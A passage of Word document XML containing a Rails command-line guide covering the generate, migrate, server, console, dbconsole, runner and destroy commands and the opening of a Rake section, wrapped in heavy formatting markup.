          <w:p w14:paraId="4BB15977"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route  resources :high_scores</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DC1F528"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dependency  model</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44E6F1F2"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exists    app/models/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6ADCB8D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exists    test/unit/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30ABE77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test/fixtures/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DDBDF0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app/models/high_score.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0706FF3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test/unit/high_score_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="327A5A6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test/fixtures/high_scores.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AEB8880"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exists    db/migrate</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58E050D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db/migrate/20100209025147_create_high_scores.rb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6960421A"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generator checks that there exist the directories for models, controllers, helpers, layouts, functional and unit tests, stylesheets, creates the views, controller, model and database migration for HighScore (creating the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>high_scores</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> table and fields), takes care of the route for the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>resource</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, and new tests for everything.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD4D024"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migration requires that we </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, that is, run some Ruby code (living in that </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>20100209025147_create_high_scores.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">) to modify the schema of our database. Which database? The sqlite3 database that Rails will create for you when we run the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> command. We’ll talk more about Rake in-depth in a little while.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="598C6F75" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B41AFB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rake db:migrate</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="220014D8"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(in /home/foobar/commandsapp)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="782C700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CreateHighScores: migrating ===============================================</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BD2499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create_table(:high_scores)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D5DA3F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-&gt; 0.0026s</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C68BFA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CreateHighScores: migrated (0.0028s) ======================================</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7B9CD1F6"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Let’s talk about unit tests. Unit tests are code that tests and makes assertions about code. In unit testing, we take a little part of code, say a method of a model, and test its inputs and outputs. Unit tests are your friend. The sooner you make peace with the fact that your quality of life will drastically increase when you unit test your code, the better. Seriously. We’ll make one in a moment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2FD13D"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Let’s see the interface Rails created for us.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1680"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="315133C7" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="277AE934" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1376078127"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0091039A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails server</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="133C2280"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Go to your browser and open </w:t>
      </w:r>
      <w:hyperlink r:id="rId906" w:history="1">
        <w:r w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://localhost:3000/high_scores</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, now we can create new high scores (55,160 on Space Invaders!)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05044DBD"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1.4 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails console</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1126F8D8"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w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>console</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> command lets you interact with your Rails application from the command line. On the underside, </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails console</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> uses IRB, so if you’ve ever used it, you’ll be right at home. This is useful for testing out quick ideas with code and changing data server-side without touching the website.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F253E41"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You can also use the alias “c” to invoke the console: </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails c</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D1F789"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If you wish to test out some code without changing any data, you can do that by invoking </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails console --sandbox</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">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6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="448094C7" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C123E3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console --sandbox</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62EB044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Loading development environment in sandbox (Rails 3.1.0)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D0FE857"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Any modifications you make will be rolled back on exit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16513590"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irb(main):001:0&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="13D86A5E"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1.5 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails dbconsole</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707543FB"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rails dbconsole</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> figures out which database you’re using and drops you into whichever command line interface you would use with it (and figures out the command line parameters to give to it, too!). It supports MySQL, PostgreSQL, SQLite and SQLite3.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBDD7FD"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You can also use the alias “db” to invoke the dbconsole: </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails db</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5713DCA6"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1.6 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails runner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3004C10B"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runner</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> runs Ruby code in the context of Rails non-interactively. For instance:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5040"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="4B7DCFAC" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="416E9CAF" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="120078427"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0091039A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails runner "Model.long_running_method"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3494DB1E"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You can also use the alias “r” to invoke the runner: </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails r</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA6DB60"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You can specify the environment in which the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>runner</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> command should operate using the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>-e</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> switch.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6360"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="0A97C950" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="153AC4AC" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2100255039"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0091039A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails runner -e staging "Model.long_running_method"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7C12B8D5"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1.7 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails destroy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7549BB1D"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Think of </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as the opposite of </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>generate</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. It’ll figure out what generate did, and undo it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289C2B91"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You can also use the alias “d” to invoke the destroy command: </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails d</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">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7800"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="1C372C3B" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A40200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generate model Oops</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5919C240"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exists  app/models/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C3DE7F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exists  test/unit/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DF7E87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exists  test/fixtures/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A9DBD87"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app/models/oops.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="007CA29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test/unit/oops_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="487707D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test/fixtures/oops.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1974ED1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exists  db/migrate</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35B982A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db/migrate/20081221040817_create_oops.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28D6D41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destroy model Oops</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5493DE8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notempty  db/migrate</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47CDEA1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notempty  db</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="419B566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rm  db/migrate/20081221040817_create_oops.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F4E1DD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rm  test/fixtures/oops.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72DB569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rm  test/unit/oops_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63967D9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rm  app/models/oops.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F5D828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notempty  test/fixtures</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6165E32A"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notempty  test</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CC8A5D7"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notempty  test/unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="588EEBF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notempty  test</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DFE574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notempty  app/models</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21678A7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notempty  app</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0BA88DBB" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>2 Rake</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C51FE8C"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Rake is Ruby Make, a standalone Ruby utility that replaces the Unix utility ‘make’, and uses a ‘Rakefile’ and </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.rake</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> files to build up a list of tasks. In Rails, Rake is used for common administration tasks, especially sophisticated ones that build off of each other.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509F22DD"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You can get a list of Rake tasks available to you, which will often depend on your current directory, by typing </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake --tasks</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Each task has a description, and should help you find the thing you need.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
